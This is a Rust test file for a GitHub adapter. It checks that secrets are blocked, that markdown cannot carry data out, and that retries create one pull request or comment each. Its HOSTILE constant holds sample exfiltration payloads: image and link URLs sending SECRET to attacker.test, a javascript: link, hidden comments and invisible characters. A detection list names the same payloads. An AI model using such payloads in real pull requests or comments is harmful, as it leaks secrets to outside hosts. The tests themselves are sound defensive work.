//! Negative tests owned by the GitHub adapter, text part: NT-SEC-03 (text with a secret is
//! blocked, and nothing is sent), NT-SEC-04 (markdown cannot carry data out) and NT-LSE-03
//! (a retry makes one pull request and one comment).

mod common;

use common::harness::{FIXTURE, Options, World};
use common::transports::LosesAnswers;
use factory_domain::values::Slug;
use factory_domain::vocabulary::StageKind;
use factory_github::Method;
use factory_ports::githost::{
    ChangeHost, CheckConclusion, CheckRequest, CheckStatus, CommentTarget, DraftPrRequest,
    GitHostError, GitScope, PullRequestRef,
};
use factory_ports::paths::{BranchName, CommitSha, RepoRef};
use factory_testkit::contracts::githost::scope;
use factory_testkit::fx::canary::{CanaryKind, CanarySet};

fn delivery() -> GitScope {
    GitScope {
        stage: StageKind::Delivery,
        ..scope(1, 1)
    }
}

fn branch(name: &str) -> BranchName {
    BranchName::new(name).unwrap()
}

fn draft(body: &str) -> DraftPrRequest {
    DraftPrRequest {
        head: branch("factory/job-1"),
        base: branch("main"),
        title: "Add a word count command".to_owned(),
        body: body.to_owned(),
    }
}

fn pr_target(number: u64) -> CommentTarget {
    CommentTarget::PullRequest(PullRequestRef {
        repo: RepoRef::parse(FIXTURE).unwrap(),
        number,
    })
}

fn commit_of(world: &World) -> CommitSha {
    CommitSha::parse(&world.fake.branch_sha(FIXTURE, "factory/job-1").unwrap()).unwrap()
}

fn check(world: &World, title: &str, summary: &str) -> CheckRequest {
    CheckRequest {
        commit: commit_of(world),
        name: Slug::parse("factory-validation").unwrap(),
        external_id: Slug::parse("run-1").unwrap(),
        status: CheckStatus::Completed(CheckConclusion::Success),
        title: title.to_owned(),
        summary: summary.to_owned(),
        details_url: None,
    }
}

// ---- NT-SEC-03 -------------------------------------------------------------------------------

#[tokio::test]
async fn negative_nt_sec_03_text_with_a_secret_is_blocked_everywhere_and_nothing_is_sent() {
    let world = World::new();
    let host = world.adapter.change_host();
    let scope = delivery();
    // A pull request that exists, so that the update and the comment have a target.
    let pr = host
        .open_draft_pull_request(&scope, draft("Evidence follows."))
        .await
        .unwrap();
    let target = CommentTarget::PullRequest(pr.clone());

    let canaries = CanarySet::generate();
    // One that a pattern finds, one that only the registry knows (a database password has no
    // vendor format).
    let by_pattern = [
        canaries
            .get(CanaryKind::GithubInstallationToken)
            .value()
            .to_owned(),
        canaries.get(CanaryKind::ModelApiKey).value().to_owned(),
    ];
    let password = canaries
        .get(CanaryKind::DatabasePassword)
        .value()
        .to_owned();
    world
        .redactor
        .register("database_password", &password)
        .unwrap();

    let before = world.fake.requests().len();
    let mut tried = 0;
    for secret in by_pattern.iter().chain([&password]) {
        let text = format!("Debug output: {secret} (end)");
        assert_eq!(
            host.post_comment(&scope, &target, &text, "leak").await,
            Err(GitHostError::UnsafeText)
        );
        assert_eq!(
            host.update_pull_request_body(&scope, &pr, &text, None)
                .await,
            Err(GitHostError::UnsafeText)
        );
        let mut request = draft("fine");
        request.body = text.clone();
        assert_eq!(
            host.open_draft_pull_request(&scope, request).await,
            Err(GitHostError::UnsafeText)
        );
        let mut request = draft("fine");
        request.title = text.clone();
        assert_eq!(
            host.open_draft_pull_request(&scope, request).await,
            Err(GitHostError::UnsafeText)
        );
        assert_eq!(
            host.publish_check(&scope, check(&world, "Validation", &text))
                .await,
            Err(GitHostError::UnsafeText)
        );
        assert_eq!(
            host.publish_check(&scope, check(&world, &text, "Every gate ran."))
                .await,
            Err(GitHostError::UnsafeText)
        );
        tried += 6;
    }
    // A branch name is text bound for GitHub too.
    for secret in &by_pattern {
        let name = branch(&format!("factory/{secret}"));
        assert_eq!(
            host.push_target(&scope, &name).await.err(),
            Some(GitHostError::UnsafeText)
        );
        let mut request = draft("fine");
        request.head = name;
        assert_eq!(
            host.open_draft_pull_request(&scope, request).await,
            Err(GitHostError::UnsafeText)
        );
        tried += 2;
    }
    assert!(tried >= 20);
    assert_eq!(
        world.fake.requests().len(),
        before,
        "the code host received no request for any of them"
    );
    assert!(world.fake.comments(FIXTURE, pr.number).is_empty());
}

// ---- NT-SEC-04 -------------------------------------------------------------------------------

const HOSTILE: &str = "Result: ![x](https://attacker.test/?d=SECRET) and <img src=\"https://attacker.test/i.png\"> \
[click](https://attacker.test/?d=SECRET) and [click][ref] and <https://attacker.test/auto> and \
<a href=\"https://attacker.test/a\">a</a> and [x](javascript:alert(1)).\n\n\
[ref]: https://attacker.test/?d=SECRET\n\n\
<!-- hidden: SECRET -->zero\u{200b}width\u{202e}text\n\n\
@alice @bob @org/team @carol @dave and other/repo#12 and www.attacker.test/x";

fn assert_clean(text: &str, what: &str) {
    // The one hidden comment the adapter itself adds is the marker of a comment.
    let text: String = text
        .lines()
        .filter(|line| !line.starts_with("<!-- factory-comment:"))
        .collect::<Vec<_>>()
        .join("\n");
    for needle in [
        "attacker.test",
        "<img",
        "<a ",
        "<a>",
        "<!--",
        "javascript:",
        "![",
        "](http",
        "]: ",
    ] {
        assert!(
            !text.contains(needle),
            "{what} still holds {needle:?}: {text}"
        );
    }
    assert!(
        text.chars().all(|c| !matches!(c, '\u{200b}' | '\u{202e}')),
        "{what}: hidden characters"
    );
    for (index, c) in text.char_indices() {
        if c == '@' {
            assert!(
                text[..index].ends_with('`'),
                "{what}: an active mention at {index}: {text}"
            );
        }
    }
    assert!(
        !text.contains(" other/repo#12"),
        "{what}: a cross-repository reference"
    );
    assert!(text.len() <= 60_000, "{what}: over the cap");
    assert!(text.contains("Result:"), "{what}: the prose survives");
}

#[tokio::test]
async fn negative_nt_sec_04_markdown_cannot_carry_data_out_through_any_path_to_the_code_host() {
    let world = World::new();
    let host = world.adapter.change_host();
    let scope = delivery();

    let pr = host
        .open_draft_pull_request(&scope, draft(HOSTILE))
        .await
        .unwrap();
    let shown = world.fake.pull_json(FIXTURE, pr.number).unwrap();
    assert_clean(shown["body"].as_str().unwrap(), "the pull request body");

    host.update_pull_request_body(&scope, &pr, HOSTILE, None)
        .await
        .unwrap();
    let shown = world.fake.pull_json(FIXTURE, pr.number).unwrap();
    assert_clean(shown["body"].as_str().unwrap(), "the updated body");

    host.post_comment(
        &scope,
        &CommentTarget::PullRequest(pr.clone()),
        HOSTILE,
        "hostile",
    )
    .await
    .unwrap();
    assert_clean(&world.fake.comments(FIXTURE, pr.number)[0], "the comment");

    host.publish_check(&scope, check(&world, "Validation", HOSTILE))
        .await
        .unwrap();
    let recorded = world.extras.checks.lock().unwrap().last().cloned().unwrap();
    assert_clean(&recorded.summary, "the check summary");

    // A title is one line with nothing hidden in it.
    let mut request = draft("fine");
    request.head = branch("factory/job-2");
    request.title = "Add\u{202e} a\nword\u{200b} count".to_owned();
    let second = host.open_draft_pull_request(&scope, request).await.unwrap();
    let title = world.fake.pull_json(FIXTURE, second.number).unwrap()["title"]
        .as_str()
        .unwrap()
        .to_owned();
    assert_eq!(title, "Add a word count");
}

#[tokio::test]
async fn negative_nt_sec_04_a_body_over_the_length_cap_is_refused_and_not_cut() {
    let world = World::new();
    let host = world.adapter.change_host();
    let scope = delivery();
    let long = "word ".repeat(13_000);
    assert!(long.len() > 60_000);
    assert!(matches!(
        host.open_draft_pull_request(&scope, draft(&long)).await,
        Err(GitHostError::Rejected(
            factory_ports::githost::Rejection::TextBounds
        ))
    ));
    assert!(world.fake.pull_numbers(FIXTURE).is_empty());
}

// ---- NT-LSE-03 -------------------------------------------------------------------------------

#[tokio::test]
async fn negative_nt_lse_03_a_retry_after_a_lost_answer_makes_one_pull_request() {
    let world = World::with(Options {
        wrap: Some(Box::new(|inner| {
            LosesAnswers::once(inner, Method::Post, "/pulls")
        })),
        ..Options::default()
    });
    let host = world.adapter.change_host();
    let scope = delivery();
    // The branch was pushed, the pull request is created, and the answer never arrives.
    assert_eq!(
        host.open_draft_pull_request(&scope, draft("Evidence follows."))
            .await,
        Err(GitHostError::Unavailable)
    );
    assert_eq!(
        world.fake.pull_numbers(FIXTURE).len(),
        1,
        "the request had its effect"
    );
    let again = host
        .open_draft_pull_request(&scope, draft("Evidence follows."))
        .await
        .unwrap();
    assert_eq!(world.fake.pull_numbers(FIXTURE), vec![again.number]);
}

#[tokio::test]
async fn negative_nt_lse_03_a_retry_after_a_lost_answer_posts_one_comment_per_key() {
    let world = World::with(Options {
        wrap: Some(Box::new(|inner| {
            LosesAnswers::once(inner, Method::Post, "/comments")
        })),
        ..Options::default()
    });
    let host = world.adapter.change_host();
    let scope = delivery();
    let pr = host
        .open_draft_pull_request(&scope, draft("Evidence follows."))
        .await
        .unwrap();
    let target = pr_target(pr.number);
    assert_eq!(
        host.post_comment(&scope, &target, "Validation passed.", "validation-1")
            .await,
        Err(GitHostError::Unavailable)
    );
    let found = host
        .post_comment(&scope, &target, "Validation passed.", "validation-1")
        .await
        .unwrap();
    assert_eq!(world.fake.comments(FIXTURE, pr.number).len(), 1);
    // Another key is another comment, even with the same words.
    let other = host
        .post_comment(&scope, &target, "Validation passed.", "validation-2")
        .await
        .unwrap();
    assert_ne!(found, other);
    assert_eq!(world.fake.comments(FIXTURE, pr.number).len(), 2);
}

#[tokio::test]
async fn negative_nt_lse_03_a_marker_pasted_by_someone_else_does_not_stop_the_factory_from_reporting()
 {
    let world = World::new();
    let host = world.adapter.change_host();
    let scope = delivery();
    let first = host
        .open_draft_pull_request(&scope, draft("Evidence follows."))
        .await
        .unwrap();
    let mut request = draft("Evidence follows.");
    request.head = branch("factory/job-2");
    let second = host.open_draft_pull_request(&scope, request).await.unwrap();

    // The factory reports on the second pull request, and the marker it used is read back.
    host.post_comment(
        &scope,
        &pr_target(second.number),
        "Validation passed.",
        "k2",
    )
    .await
    .unwrap();
    let posted = world.fake.comments(FIXTURE, second.number).remove(0);
    let marker = posted.lines().last().unwrap().to_owned();
    assert!(marker.starts_with("<!-- factory-comment:"));

    // A person pastes that marker into a comment on the first pull request.
    world.extras.foreign_comments.lock().unwrap().insert(
        (FIXTURE.to_owned(), first.number),
        vec![serde_json::json!({
            "id": 8_000_001, "body": format!("not from the factory {marker}"),
            "user": {"login": "outsider", "id": 90, "type": "User"}
        })],
    );
    // The factory reports the same key there: the person's comment is not taken for its own.
    let made = host
        .post_comment(&scope, &pr_target(first.number), "Validation passed.", "k2")
        .await
        .unwrap();
    assert_ne!(made.id, 8_000_001);
    assert_eq!(
        world.fake.comments(FIXTURE, first.number).len(),
        1,
        "the factory's comment was posted"
    );
}
